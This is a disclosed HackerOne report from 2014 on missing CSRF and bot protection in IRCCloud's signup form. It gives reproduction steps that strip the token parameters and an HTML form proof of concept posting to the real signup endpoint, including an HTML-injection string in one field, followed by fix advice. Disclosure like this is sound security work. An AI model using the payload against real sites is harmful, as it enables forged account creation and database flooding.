# CSRF - Creating accounts

## Metadata
- **Source:** HackerOne
- **Report:** 7332 | https://hackerone.com/reports/7332
- **Submitted:** 2014-04-12
- **Reporter:** internetwache
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi there,

I've discovered the following CSRF issue: There's no CSRF / Bot protection on the registration form. 

###Details

An attacker could automate the registration process to flood your database with invalid/useless accounts. He could also source the process out to his victims (CSRF).

###Steps to reproduce
- 1. Go to https://www.irccloud.com/
- 2 . Turn on burp and submit the regi

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi there,

I've discovered the following CSRF issue: There's no CSRF / Bot protection on the registration form. 

###Details

An attacker could automate the registration process to flood your database with invalid/useless accounts. He could also source the process out to his victims (CSRF).

###Steps to reproduce
- 1. Go to https://www.irccloud.com/
- 2 . Turn on burp and submit the registration form
- 3. Remove the "token" and "_reqid" parameter from the request body and forward it
- 4. The account should be created succesfully.

CSRF PoC:

```
<html>
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="tes3&#64;internetwache&#46;org" />
      <input type="hidden" name="password" value="fooobar" />
      <input type="hidden" name="realname" value="test&quot;&gt;&lt;h1&gt;foobar&lt;&#47;h1&gt;" />
      <input type="hidden" name="invite" value="" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

###How to fix?
Either validate the "token" parameter server side or use a CAPTCHA to fight bots. The latter would be the prefered fix in my opinion. 

Yours sincerely,
Sebastian Neef

</details>

---
*Analysed by Claude on 2026-05-24*
